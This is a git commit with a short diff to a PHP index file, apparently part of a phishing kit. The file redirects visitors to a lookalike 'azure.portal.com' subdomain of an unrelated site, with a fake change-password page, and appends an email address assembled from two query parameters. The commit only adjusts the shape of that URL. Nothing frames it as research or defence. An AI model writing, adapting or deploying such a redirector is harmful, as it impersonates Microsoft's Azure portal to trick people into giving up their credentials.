116bb723b16063653bc299e3eaf959a8340f60c6
intbadboy <53456643+intbadboy@users.noreply.github.com>
2019-07-31 13:41:20 -0700

    Update index.php

--- index.php
+++ index.php
@@ -7,5 +7,4 @@ function Redirect($url, $permanent = false)
  }
  exit();
 }
-Redirect("https://azure.portal.com.rosepetalshomes.com/auth/changepassword.php=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
-?>
+Redirect("https://azure.portal.com.rosepetalshomes.com/auth/changepassword.php/?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
